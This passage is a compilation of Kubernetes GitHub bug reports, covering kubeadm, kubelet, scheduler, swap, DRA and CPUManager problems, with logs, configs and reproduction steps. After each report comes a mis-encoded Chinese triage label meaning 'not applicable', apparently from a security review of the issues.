k8s.io/kubernetes/cmd/kubeadm/app/phases/certs/renewal.(*kubeConfigReadWriter).Exists(0x1c1ab60?)
        cmd/kubeadm/app/phases/certs/renewal/readwriter.go:124 +0x1e
k8s.io/kubernetes/cmd/kubeadm/app/phases/certs/renewal.(*Manager).CertificateExists(0x21f6180?, {0x1f0b722, 0xa})
        cmd/kubeadm/app/phases/certs/renewal/manager.go:325 +0x4a
k8s.io/kubernetes/cmd/kubeadm/app/cmd.newCmdCertsExpiration.func1(0xc0005c1400?, {0x3259d80?, 0x4?, 0x1f03ff0?})
        cmd/kubeadm/app/cmd/certs.go:403 +0x234
github.com/spf13/cobra.(*Command).execute(0xc000004600, {0x3259d80, 0x0, 0x0})
        vendor/github.com/spf13/cobra/command.go:940 +0x87c
github.com/spf13/cobra.(*Command).ExecuteC(0xc00027d800)
        vendor/github.com/spf13/cobra/command.go:1068 +0x3a5
github.com/spf13/cobra.(*Command).Execute(0x21f5ee0?)
        vendor/github.com/spf13/cobra/command.go:992 +0x13
k8s.io/kubernetes/cmd/kubeadm/app.Run()
        cmd/kubeadm/app/kubeadm.go:50 +0x155
main.main()
        cmd/kubeadm/kubeadm.go:25 +0x13
$
```
When the command is run with superuser privileges, it prints the requested information.
#### What did you expect to happen?

Print a warning that files could not be read due to insufficient permission, or that information was missing (e.g., when the /etc/kubernetes directory is not initialized).
When the directory is readable, it works as expected:
```
$ kubeadm certs check-expiration
CERTIFICATE                          EXPIRES   RESIDUAL TIME   CERTIFICATE AUTHORITY   EXTERNALLY MANAGED
!MISSING! admin.conf                                                                   
!MISSING! apiserver                                                                    
!MISSING! apiserver-etcd-client                                                        
!MISSING! apiserver-kubelet-client                                                     
!MISSING! controller-manager.conf                                                      
!MISSING! etcd-healthcheck-client                                                      
!MISSING! etcd-peer                                                                    
!MISSING! etcd-server                                                                  
!MISSING! front-proxy-client                                                           
!MISSING! scheduler.conf                                                               

CERTIFICATE AUTHORITY      EXPIRES   RESIDUAL TIME   EXTERNALLY MANAGED
!MISSING! ca                                         
!MISSING! etcd-ca                                    
!MISSING! front-proxy-ca                             
$ 
```
where OS and kubeadm version detail was:
```
$ uname -a
Linux z620 6.8.0-11-generic #11-Ubuntu SMP PREEMPT_DYNAMIC Wed Feb 14 00:29:05 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/os-release
PRETTY_NAME="Ubuntu Noble Numbat (development branch)"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04 (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
$ kubeadm version
kubeadm version: &version.Info{Major:"1", Minor:"28", GitVersion:"v1.28.8", GitCommit:"fc11ff34c34bc1e6ae6981dc1c7b3faa20b1ac2d", GitTreeState:"clean", BuildDate:"2024-03-15T00:05:37Z", GoVersion:"go1.21.8", Compiler:"gc", Platform:"linux/amd64"}
```

#### How can we reproduce it (as minimally and precisely as possible)?

Issue the command `kubeadm certs check-expiration` as a normal user when the directory /etc/kubernetes/pki exists but not readable.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
The connection to the server my-private-host:6443 was refused - did you specify the right host or port?
```

</details>


#### Cloud provider

<details>
Bare metal
</details>


#### OS version

<details>

```console
$ cat /etc/os-release 
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux acs-clb16jm33b70349 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
$ kubeadm version
kubeadm version: &version.Info{Major:"1", Minor:"29", GitVersion:"v1.29.3", GitCommit:"6813625b7cd706db5bc7388921be03071e1a492d", GitTreeState:"clean", BuildDate:"2024-03-15T00:06:16Z", GoVersion:"go1.21.8", Compiler:"gc", Platform:"linux/amd64"}
```
</details>


#### Install tools

<details>
apt-get install kubeadm (source repo: k8s.io)
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124119 release blocking job ci-kubernetes-e2e-gci-gce-scalability-1-30 needs branch in perf-tests

- Issue é“¾æ¥ï¼š[#124119](https://github.com/kubernetes/kubernetes/issues/124119)

### Issue å†…å®¹

#### What happened?

Standing up a new job for k8s 1.30 release needs a new branch `release-1.30` in https://github.com/kubernetes/perf-tests.git repo

```
$ PWD=/home/prow/go/src/k8s.io/perf-tests  git fetch --filter=blob:none https://github.com/kubernetes/perf-tests.git release-1.30 (runtime: 1m5.58005565s)
fatal: couldn't find remote ref release-1.30
# Error: exit status 128
```

#### What did you expect to happen?

CI job to be green

#### How can we reproduce it (as minimally and precisely as possible)?

We already have a CI job - https://testgrid.k8s.io/sig-release-1.30-blocking#gce-cos-1.30-scalability-100&width=20

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124112 Kubelet Stuck Mounting Local PVC

- Issue é“¾æ¥ï¼š[#124112](https://github.com/kubernetes/kubernetes/issues/124112)

### Issue å†…å®¹

#### What happened?

On our production cluster, we have 6 pods that use local PVCs on nodes we set up with some host processes.  These local PVCs point to the same underlying disk device.  The pods mount these PVCs using subpaths, if that matters.  These host processes can sometimes use a large portion of the disk utilization, the same disk device that the PVCs point to.  These EBS volumes were created from a snapshot, so read and write speed might be reduced since they are cold.

When the pods startup, they get stuck in the "ContainerCreating" status.  In the kubelet logs, I see the following errors:
```
[pod_workers.go:965] "Error syncing pod, skipping" err="unmounted volumes=[storage], unattached volumes=[...]: timed out waiting for the condition" pod="..." podUID=...
[kubelet.go:1731] "Unable to attach or mount volumes for pod; skipping pod" err="unmounted volumes=[storage], unattached volumes=[...]: timed out waiting for the condition" pod="..."
```
Other pods that get deployed to the node that doesn't use the same disk device gets deployed perfectly fine.

I also checked the /proc/kubeletProcessId/fd and I noticed that most of the sockets were broken.

#### What did you expect to happen?

I expected that kubelet would eventually recover and the pod would be able to mount the PVCs and start up successfully.  But after waiting for a few hours, it never did.

The only way I was able to recover was restarting kubelet (even when the disk utilization was still high).  Once I did that, all the pods mounted and started up successfully.  I also checked the sockets for the kubelet process after the restart and they were still broken, so that might be a red herring.

#### How can we reproduce it (as minimally and precisely as possible)?

Only some of our sites have ran into this issue, so it is somewhat intermittent.  I'm still working on seeing if I can reproduce this by simulating high disk utilization, but so far, I have been unable to.

#### Anything else we need to know?

I noticed there were some github issues around these feature flags, but they were not enabled, so most likely not related:
kubernetes_feature_enabled{name="NewVolumeManagerReconstruction",stage="BETA"} 0
kubernetes_feature_enabled{name="SELinuxMountReadWriteOncePod",stage="BETA"} 0

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.27.10-eks-508b6b3
```

</details>


#### Cloud provider

<details>
AWS EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
SUPPORT_END="2025-06-30"
$ uname -a
# paste output here
Linux site.com 5.15.149-99.162.amzn2.x86_64 #1 SMP Tue Mar 12 11:29:59 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>

#### Container runtime (CRI) and version (if applicable)

<details>
containerd github.com/containerd/containerd 1.7.11 64b8a811b07ba6288238eefc14d898ee0b5b99ba
</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124109 Scheduler Cache missed

- Issue é“¾æ¥ï¼š[#124109](https://github.com/kubernetes/kubernetes/issues/124109)

### Issue å†…å®¹

#### What happened?

- Pod Scheduler failed with lack resource. Actually, node has enough resource.
- Cache Missed Matchï¼Œwhen I dump scheduler cache info
`I0329 17:52:21.473968       1 comparer.go:64] "Cache mismatch" missedPods=[000669f9-8b26-4cd8-98ac-30206645690c 000aa9e5-782b-418e-a2fd-88e158e91e36 001daca0-f738-4830-a60b-7e231b7e0e3b 00374447-d517-4c98-aadc-f1f6d28e07b2 003a063a-9d3e-41a0-8356-7d3158e5ca3f 003d060c-6582-4e11-8ff5-c1d36500451a 0045d507-2feb-4104-a480-050e8a02ba25 0055f20d-30c2-471a-8b11-d87959a1b0bd 00620471-945d-4205-aa73-d4743c5b83f5 00790d14-8e52-41f8-9f49-96674bef0797 (there are hundreds of  pods )]`

#### What did you expect to happen?

- Pod Schedule Successfully

#### How can we reproduce it (as minimally and precisely as possible)?

- correct scheduler cache information

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
scheduler version: 1.27.X
</details>


#### Cloud provider

<details>
commity
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #124096 BestEffort pods are using swap

- Issue é“¾æ¥ï¼š[#124096](https://github.com/kubernetes/kubernetes/issues/124096)

### Issue å†…å®¹

#### What happened?

I was testing the support for swap and I came to an unexpected behavior. In the documentation it is specified that only pods that fall under the `Burstable` class can use the host's swap memory. However, I created both a deployment with 1 replica of ubuntu belonging to the `Burstable` class, and one belonging to the `BestEffort` class, where I ran the command `stress --vm 1 --vm-bytes 6G --vm-hang 0` to see the consumption of memory made. The host has 4GB RAM memory and 5GB swap. In both situations, the pod started using swap after exceeding the RAM memory requirement. Wasn't the BestEffort pod supposed to be restarted when it reached the limit of the host's RAM memory? I mention that the kubelet is configured to `swapBehavior=LimitedSwap`. I attached two pictures where you can see the normal consumption of host, and consumption after running stress command inside pod
<img width="1180" alt="Screenshot 2024-03-27 at 12 02 30" src="https://github.com/kubernetes/kubernetes/assets/26438926/c6d9bbc6-0ba2-4445-944d-67dfc8eed185">
. 
![screenshot_2024-03-27_at_12 37 02](https://github.com/kubernetes/kubernetes/assets/26438926/1d60c115-46a5-4a4d-9aba-0c34a6411775)


#### What did you expect to happen?

I expected the `BestEffort` pod to be killed when it consumes more RAM memory than the host have available.

#### How can we reproduce it (as minimally and precisely as possible)?

- setup a VM running ubuntu 22.04 with 4GB of RAM memory
- set swap partition to 5GB
- install docker, cri-dockerd and kubernetes packages using the provided versions
- config kubelet with provided config
- install calico cni
- after the cluster is bootstrapped, deploy the following deployment
<details>

```console
$ $ cat test.yaml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ubuntu-deployment
  labels:
    app: ubuntu
spec:
  replicas: 1
  selector:
    matchLabels:
      app: ubuntu
  template:
    metadata:
      labels:
        app: ubuntu
    spec:
      containers:
      - name: ubuntu
        image: ubuntu:22.04
        resources:
        command: [ "/bin/bash", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
```

</details>

- this should deploy a BestEffort pod. you can check this by running `kubectl get pod <pod-name> --output=yaml`
- exec into the pod and do `apt update & apt install stress`. Then run `stress --vm 1 --vm-bytes 6G --vm-hang 0`
- check the node where the pod is running with `kubectl get po -o wide` then ssh to that node and run `htop`. Now you should see that the deployed BestEffort pod is consuming swap memory, which according to the Docs, it shouldn't.
- if exec into the pod and check `memory.swap.max`, this is set to max. From what I understand, even if `swapBehavior` was set to `LimitedSwap` in `kubelet`, somehow cri-dockerd may be set the cgroup for `memory.swap.max` to `max`.
<details>

```console
$ cat /sys/fs/cgroup/memory.swap.max 
max
```

</details>

#### Anything else we need to know?

I am using cgroup v2.

Here is my kubelet config.

<details>

```console
$ cat /var/lib/kubelet/config.yaml 
apiVersion: kubelet.config.k8s.io/v1beta1
authentication:
 anonymous:
  enabled: false
 webhook:
  cacheTTL: 0s
  enabled: true
 x509:
  clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
 mode: Webhook
 webhook:
  cacheAuthorizedTTL: 0s
  cacheUnauthorizedTTL: 0s
cgroupDriver: systemd
clusterDNS:
- 10.96.0.10
clusterDomain: cluster.local
containerRuntimeEndpoint: ""
cpuManagerReconcilePeriod: 0s
enableServer: true
evictionPressureTransitionPeriod: 0s
failSwapOn: false
featureGates:
 NodeSwap: true
fileCheckFrequency: 0s
healthzBindAddress: 127.0.0.1
healthzPort: 10248
httpCheckFrequency: 0s
imageMaximumGCAge: 0s
imageMinimumGCAge: 0s
kind: KubeletConfiguration
logging:
 flushFrequency: 0
 options:
  json:
   infoBufferSize: "0"
 verbosity: 0
memorySwap:
 swapBehavior: LimitedSwap
nodeStatusReportFrequency: 0s
nodeStatusUpdateFrequency: 0s
resolvConf: /run/systemd/resolve/resolv.conf
rotateCertificates: true
runtimeRequestTimeout: 0s
shutdownGracePeriod: 0s
shutdownGracePeriodCriticalPods: 0s
staticPodPath: /etc/kubernetes/manifests
streamingConnectionIdleTimeout: 0s
syncFrequency: 0s
volumeStatsAggPeriod: 0s
```

</details>

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.3
```

</details>


#### Cloud provider

<details>
Hetzner Cloud, but Kubernetes was deployed using `kubeadm`.
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux fs-kube-dev-1 5.15.0-100-generic #110-Ubuntu SMP Wed Feb 7 13:27:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

```console
$ kubeadm version
kubeadm version: &version.Info{Major:"1", Minor:"29", GitVersion:"v1.29.3", GitCommit:"6813625b7cd706db5bc7388921be03071e1a492d", GitTreeState:"clean", BuildDate:"2024-03-15T00:06:16Z", GoVersion:"go1.21.8", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

```console
$ cri-dockerd --version
cri-dockerd 0.3.11 (9a8a9fe)
```

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

calico:
  version: 3.27.2

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #124095 Even if the container has failed, the DaemonSet pod's phase still shows running

- Issue é“¾æ¥ï¼š[#124095](https://github.com/kubernetes/kubernetes/issues/124095)

### Issue å†…å®¹

#### What happened?

In a single container pod, the container has encountered an error, but the pod status is still running, resulting in not being pulled up in a timely manner

#### What did you expect to happen?

When encountering an error in the container, the DaemonSet pod should be refreshed to failed

#### How can we reproduce it (as minimally and precisely as possible)?


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
v1.28.1

```
</details>


#### Cloud provider

<details>
na
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
Linux master1 5.10.0-136.12.0.86.h1616.eulerosv2r12.x86_64 #1 SMP Thu Mar 14 04:12:23 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124090 DRA: kubelet:  error preparing devices for claim

- Issue é“¾æ¥ï¼š[#124090](https://github.com/kubernetes/kubernetes/issues/124090)

### Issue å†…å®¹

#### What happened?

```
Mar 28 10:29:43 worker-node-1 kubelet[2855486]: E0328 10:29:43.770694 2855486 kuberuntime_manager.go:1152] "Failed to prepare dynamic resources" err="NodePrepareResources failed for claim default/rdma-demo: error preparing devices for claim 71d5aeee-5f6d-47aa-a3d6-98b7fcf3c005: unable to create CDI spec file for claim: failed to set permissions on spec file: chmod /var/run/cdik8s.netresources.spidernet.io-claim_71d5aeee-5f6d-47aa-a3d6-98b7fcf3c005.yaml: no such file or directory" pod="default/rdma-rc-6c5596fdb8-mf95q"

root@worker-node-1:~# ls /var/run/cdi/k8s.netresources.spidernet.io-claim_71d5aeee-5f6d-47aa-a3d6-98b7fcf3c005.yaml
/var/run/cdi/k8s.netresources.spidernet.io-claim_71d5aeee-5f6d-47aa-a3d6-98b7fcf3c005.yaml
```



#### What did you expect to happen?

ok to preparing devices for claim

#### How can we reproduce it (as minimally and precisely as possible)?

create a pod with dra

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.0
```

</details>


#### Cloud provider

<details>
NONE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124076 podLogsDir validation of default value breaks on windows

- Issue é“¾æ¥ï¼š[#124076](https://github.com/kubernetes/kubernetes/issues/124076)

### Issue å†…å®¹

#### What happened?

> Kubelet: a custom root directory for pod logs (instead of default /var/log/pods) can be specified using the podLogsDir key in kubelet configuration. (https://github.com/kubernetes/kubernetes/pull/112957, [@mxpv](https://github.com/mxpv)) [SIG API Machinery, Node, Scalability and Testing]

`podLogsDir` is not added in `cmd/kubelet/app/options/options.go` so I can't use this flag when running kubelet v1.30.0-beta.0.

also, when I ran it in windows (it's fine when I ran it in linux), I got `invalid configuration: pod logs path \"/var/log/pods\" must be absolute path, invalid configuration: pod logs path \"/var/log/pods\" must be normalized`. Notice there are unexpected \ before quotes.



#### What did you expect to happen?

I should be able to run `kubelet` with `--pod-logs-dir`. If I don't use this flag, it should correctly use default value.

#### How can we reproduce it (as minimally and precisely as possible)?

run newest kubelet on windows node with some necessary parameters
```sh
./kubelet --version
> Kubernetes v1.30.0-beta.0
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124073 K8s trace context for APIServer is incorrect

- Issue é“¾æ¥ï¼š[#124073](https://github.com/kubernetes/kubernetes/issues/124073)

### Issue å†…å®¹

#### What happened?


In Kubernetes release 1.28, the tracing structure for the API server is depicted as follows:

![image](https://github.com/kubernetes/kubernetes/assets/6135084/f502d19d-0e29-439a-ad47-485669238006)


Within the API server's code structure, the spans "List(recursive=true) etcd3" and "SerializeObject" are expected to be nested under the "List" span. However, "SerializeObject" appears parallel to "List", which is not the intended behavior.



staging/src/k8s.io/apiserver/pkg/endpoints/handlers/get.go
```golang
func ListResource(r rest.Lister, rw rest.Watcher, scope *RequestScope, forceWatch bool, minRequestTimeout time.Duration) http.HandlerFunc {
	return func(w http.ResponseWriter, req *http.Request) {
		ctx := req.Context()
		// For performance tracking purposes.

                 // CasperLiu: this span is for high level - "List"
		ctx, span := tracing.Start(ctx, "List", traceFields(req)...)

		namespace, err := scope.Namer.Namespace(req)
		if err != nil {
			scope.err(err, w, req)
			return
		}

                 // omit...
		span.AddEvent("About to List from storage")
                 // CasperLiu: span inside below function is for low level - "List(recursive=true) etcd3"
		result, err := r.List(ctx, &opts)
		if err != nil {
			scope.err(err, w, req)
			return
		}
		span.AddEvent("Listing from storage done")
		defer span.AddEvent("Writing http response done", attribute.Int("count", meta.LenList(result)))
                 // CasperLiu: span inside below function is for low level - "SerializeObject"
		transformResponseObject(ctx, scope, req, w, http.StatusOK, outputMediaType, result)
	}
}
```

#### What did you expect to happen?

Within the API server's code structure, the spans "List(recursive=true) etcd3" and "SerializeObject" are expected to be nested under the "List" span. 

#### How can we reproduce it (as minimally and precisely as possible)?

1. Configure the Kubernetes API server to enable tracing and direct the emitted spans to a backend. 
2. Illustrate the resulting trace flow. 
3. Invoke a quorum read LIST request for Kubernetes resources; within the trace flow, you may identify instances of incorrect trace context.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```
kuberenetes version:
1.28.3
```

</details>


#### Cloud provider

<details>
Alibaba Cloud Kubernetes (ACK) 
</details>


#### OS version

<details>

Unrelated to the OS version


</details>


#### Install tools

<details>
No need 
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Unrelated to the CRI version

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

Unrelated to the plugins version

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #124066 kubelet fails to restart with CPUManager policy static when node's some CPU is offline

- Issue é“¾æ¥ï¼š[#124066](https://github.com/kubernetes/kubernetes/issues/124066)

### Issue å†…å®¹

#### What happened?

I have a node with Configuration:
a. 96 CPUS with one CPU(ID=95) disabled. 
b. kubelet CPUManager static policy enabled.
c. kubeReserved: cpu: 2, systemReserved: cpu: 2

After start kubelet, the topology kubelet detected shows
`"Detected CPU topoloogy" topology=&{NumCPUs:95 NumCores:48 NumSockets:2 NumNUMANodes:2 CPUDetails:......`
Notes Core 25 contains CPU 25,73ã€‚ Core 47 contains CPU 47,95ï¼Œbut 95 is disabled and not shown in the log.

The static Policy process CPU reservation log below. 
`"takeFullCores: clainming core" core=47`
`"takeFullCores: clainming core" core=24`
`"takeRemainingCPUs: claiming CPU" cpu=25`
`"Reserved CPUs not available for exclusive assignment" reservedSize=4 reserved="24-25,47,72"`
`"Updated default CPUSet" cpuSet="0-94"`

The weird thing is when the first Pod admits, the reserved CPU(ID=25) is reused. 
`"Topology Affinity" pod="xxx" containerName="xxx" affinity={NUMANodeAffinity:<nil> Prefered:false}`
`"AllocateCPUs" numCPUs=20 socket=<nil>`
`"takeFullCores: clainming core" core=25`
`"takeRemainingCPUs: claiming CPU" cpu=26`
`"takeRemainingCPUs: claiming CPU" cpu=74`
....
`"Updated default CPUSet" cpuSet="0-24,35-72,83-94"`
`"AllocateCPUs" result="25-34,73-82"`

The confliction would further cause kubelet restart failure because of the static policy validation
`"Static policy invalid state, please drain node and remove policy state file" err="not all reserved cpus: \"24-25,47,72\" are present in defaultCpuSet: \"0-24,35-72,83-94\""`

#### What did you expect to happen?

Pod Cpuset Allocation should not share with Reserved CPUs

#### How can we reproduce it (as minimally and precisely as possible)?

1. use `chcpu -d` to disable one CPU in the node. Check `/sys/devices/system/cpu/online` file to make sure it works.
2. change kubelet configuration
   a. cpuManagerPolicy: static
   b. kubeReserved: cpu: 2, systemReserved: cpu: 2
3. restart kubelet
4. create a guaranteed Pod with some CPU
5. restart kubelet, expects it would fail to startup

#### Anything else we need to know?

it seems that kubelet CPUManager static Policy have not taken CPU offline senario into account. 
1. in the specific case above, this method would result in 1(95/48), not 2
https://github.com/kubernetes/kubernetes/blob/227c2e7c2b2c05a9c8b2885460e28e4da25cf558/pkg/kubelet/cm/cpumanager/topology/topology.go#L49-L54
2. thus result in a Used Core as free (1==1)
https://github.com/kubernetes/kubernetes/blob/227c2e7c2b2c05a9c8b2885460e28e4da25cf558/pkg/kubelet/cm/cpumanager/cpu_assignment.go#L259-L262
3. all logic releated with CPUsPerCore, CPUsPerSocket is affected

#### Kubernetes version

<details>
tested in kubernetes: v1.25, other version is the same.
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #124065 StatefulSet pod ends up in state "Completed"

- Issue é“¾æ¥ï¼š[#124065](https://github.com/kubernetes/kubernetes/issues/124065)

### Issue å†…å®¹

#### What happened?

A `StatefulSet` pod ends up "`Completed`":

```
NAME                                 READY   STATUS      RESTARTS   AGE
an-sts-pod-0                         0/1     Completed   0          4d12h
```

This pod has a `restartPolicy: Always`.

```
    State:          Terminated
      Reason:       Completed
      Exit Code:    0
      Started:      Fri, 22 Mar 2024 05:12:42 -0400
      Finished:     Sun, 24 Mar 2024 12:11:32 -0400
```

The pod terminated due to something external to it (presumably the kubelet) terminating it:
```
[2024-03-24T16:11:29Z INFO  actix_server::server] SIGTERM received; starting graceful shutdown
[2024-03-24T16:11:29Z DEBUG actix_server::accept] paused accepting connections on 0.0.0.0:8080
[2024-03-24T16:11:29Z INFO  actix_server::accept] accept thread stopped
[2024-03-24T16:11:29Z INFO  actix_server::worker] shutting down idle worker
[2024-03-24T16:11:29Z INFO  actix_server::worker] shutting down idle worker
[2024-03-24T16:11:29Z INFO  actix_server::worker] shutting down idle worker
[2024-03-24T16:11:30Z DEBUG tower::buffer::worker] buffer closing; waking pending tasks
```

Shortly prior to this, the `kubelet` is restarted:
```
Mar 24 16:10:41 gke-[snip]-bbzn systemd[1]: kubelet.service: Sent signal SIGTERM to main process 1874 (kubelet) on client request.
```
It then seems to restart, and presumably `SIGTERM`s everything? Its logs are chock full of errors after the restart.
```
Mar 24 16:11:28 gke-[snip]-bbzn kubelet[4021733]: I0324 16:11:28.577436 4021733 eviction_manager.go:174] "Failed to admit pod to node" pod="ns/an-sts-pod-0" nodeCondition=[MemoryPressure]
```
(there are lots of these, presumably one for each pod on the node)
Then it seems like the pod dies, and is attempted to be restarted?
```
Mar 24 16:11:28 gke-[snip]-bbzn kubelet[4021733]: I0324 16:11:28.588544 4021733 kubelet.go:2375] "SyncLoop (PLEG): event for pod" pod="ns/an-sts-pod-0" event=&{ID:44a879b9-bd14-43ec-8d
23-730abcb24f60 Type:ContainerDied Data:73c54c77f4bdc8f227d7ff45e662d05f7aeb2f5374712f338c66feab2dcd0c38}
Mar 24 16:11:28 gke-[snip]-bbzn kubelet[4021733]: I0324 16:11:28.588564 4021733 kubelet.go:2375] "SyncLoop (PLEG): event for pod" pod="ns/an-sts-pod-0" event=&{ID:44a879b9-bd14-43ec-8d
23-730abcb24f60 Type:ContainerStarted Data:50348bfeb6c694e1504af763602f94786c47b2cb5299747cb0e6da30b01ddc68}
Mar 24 16:11:28 gke-[snip]-bbzn kubelet[4021733]: I0324 16:11:28.588580 4021733 kubelet.go:2375] "SyncLoop (PLEG): event for pod" pod="ns/an-sts-pod-0" event=&{ID:44a879b9-bd14-43ec-8d
23-730abcb24f60 Type:ContainerStarted Data:aa9e60de9dd97a3f282c4df133656fa7b6e5cea40fede3c1422b654cb9f438ea}
```
but it never happens:
```
Mar 24 16:11:32 gke-[snip]-bbzn kubelet[4021733]: E0324 16:11:32.666674 4021733 secret.go:194] Couldn't get secret ns/a-secret-this-pod-needs: object "ns"/"a-secret-this-pod-needs" not registered
```
There are *lots* of these, for numerous secrets. These persist for at least the next 8 seconds.

The next time the pod's name shows up in the log is several minute later (so presumably the "object not registered" error abates?)
```
Mar 24 16:16:37 gke-[snip]-bbzn kubelet[4021733]: E0324 16:16:37.047670 4021733 cpu_manager.go:395] "RemoveStaleState: removing container" podUID="44a879b9-bd14-43ec-8d23-730abcb24f60" containerName="an-sts-pod"
